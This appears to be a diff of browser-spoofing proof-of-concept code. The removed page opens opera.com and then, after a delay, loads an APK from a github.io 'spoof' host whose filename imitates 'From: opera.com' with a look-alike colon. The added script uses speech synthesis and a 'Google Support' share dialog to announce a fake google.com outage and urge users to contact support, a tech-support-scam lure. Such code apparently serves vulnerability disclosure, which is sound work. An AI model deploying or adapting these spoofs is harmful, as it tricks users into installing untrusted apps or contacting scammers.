@@ -1,30 +1,46 @@
-<html>
- <head> 
-  <meta charset="utf-8">
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-}
-</style>
- </head> 
- <body> 
-  <script>
-function a(){
-    window.open('https://www.opera.com/gx', 'x');
-    setTimeout(function(){
-        window.open('https://cnfdnfial-ops.github.io/spoof/From%E2%88%B6%20opera.com%20OperaGX.apk', 'x');
-    }, 5000);
-}
-</script> 
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
- </body>
-</html>
+<script>
+const btn = document.getElementById('speechBtn');
+const status = document.getElementById('status');
+
+btn.addEventListener('click', async () => {
+
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+
+  if (!('speechSynthesis' in window)) {
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
+  }
+
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = 'en-US';
+
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith('en'));
+  if (enVoice) utter.voice = enVoice;
+
+  status.textContent = "Triggering actions...";
+
+  // Trigger speech
+  speechSynthesis.speak(utter);
+
+  // Web Share API
+  if (navigator.share) {
+    try {
+      await navigator.share({
+        title: "Google Support",
+        text: "google.com is currently under maintenance. Contact support.",
+        url: "https://google.com"
+      });
+      console.log("[PoC] Share triggered");
+    } catch (err) {
+      console.log("Share cancelled", err);
+    }
+  } else {
+    console.log("Web Share API not supported");
+  }
+
+  // Open new tab
+  window.open('https://google.com', '_blank');
+
+});
+</script>
